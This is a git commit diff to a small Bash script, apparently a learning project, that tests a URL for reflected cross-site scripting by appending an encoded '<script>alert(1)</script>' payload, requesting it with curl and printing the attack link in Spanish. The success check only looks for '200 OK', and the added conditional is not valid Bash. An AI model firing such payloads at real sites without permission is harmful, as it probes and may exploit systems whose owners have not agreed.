224c1ffbf028df1ce13988336bc33add9d9309b6
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-04-26 16:02:58 +0200

    Update 2_xss.sh

--- 2_xss.sh
+++ 2_xss.sh
@@ -5,8 +5,14 @@ if [[ $search ]] # | grep 'method=\"GET\"' ]]
 then
   XSS="%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
   ATTACK="$URL$XSS"
-  curl -i $ATTACK | grep "200 OK"
-#  else
+  if [[ curl -i $ATTACK | grep "200 OK" ]]
+  then
+    echo -e "Haz clic en el siguiente enlace para ver el resultado del ataque: \n$ATTACK"
+  else
+    echo "Disculpa, el ataque no ha funcionado."
+  fi
+#else
+ 
  # if  [[ curl $URL | grep 'method=\"POST\"' ]]
 #  then
   #aqui ejecutamos xss con post, checkear si tambien esta comment
